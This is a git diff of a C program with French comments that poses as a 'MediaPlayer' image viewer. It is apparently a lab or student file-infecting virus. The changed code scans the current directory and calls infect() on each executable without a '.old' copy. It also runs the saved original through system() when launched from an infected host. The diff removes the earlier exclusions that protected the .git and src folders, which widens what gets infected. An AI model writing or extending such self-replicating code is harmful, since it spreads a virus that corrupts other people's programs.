@@ -11,14 +11,14 @@ int main(int argc, char *argv[]) {
         globalptr = &name;
 
         // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
-        if(strcmp(argv[0],"./MediaPlayer")) {       // HOTE INFECTE
+        if(strcmp(argv[0],"./MediaPlayer.exe")) {       // HOTE INFECTE
                 char *extension = ".old";
                 char str[100];
                 snprintf(str, sizeof str, "%s%s", name, extension);
                 system(str);
         }
         else {          // MEDIAPLAYER
-                listeFichier(".jpeg");
+                mediaplayer(".jpeg");
         }
 
         // INFECTION
@@ -27,20 +27,34 @@ int main(int argc, char *argv[]) {
 
         myDir = opendir(".");
         if (myDir) {
-                while ((dir = readdir(myDir)) != NULL)
-                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT et SRC /!\/!\/!|
-                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name)))
-                                if(strstr(dir->d_name, ".old") == NULL)
-                                        if (access(dir->d_name, X_OK) == 0)
-                                                if (fopen(dir->d_name,"r"))
-                                                        infect(dir->d_name);
+                while ((dir = readdir(myDir)) != NULL) {
+                        DIR* directory = opendir(dir->d_name);
+                        if(directory != NULL)
+                                closedir(directory);
+                        else {
+                                if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp("MediaPlayer.exe", dir->d_name))) {
+                                        if(strstr(dir->d_name, ".old") == NULL) {
+                                                if (access(dir->d_name, X_OK) == 0) {
+                                                        char *String = malloc(strlen(dir->d_name) + strlen(".old") + 1);
+                                                        if(String) {
+                                                                strcpy(String,dir->d_name);
+                                                                strcat(String,".old");
+                                                        }
+                                                        if (!fopen(String,"r")) {
+                                                                //(true) ? printf("ok") : printf("pas ok");
+                                                                infect(dir->d_name);
+                                                        }
+                                                }
+                                        }
+                                }
+                        }
+                }
                 closedir(myDir);
         }
-
-        return 0;
+        return EXIT_SUCCESS;
 }
 
-void listeFichier(char *extension) {
+void mediaplayer(char *extension) {
         DIR *myDir;
         struct dirent *dir;
         bool imgFound = false;
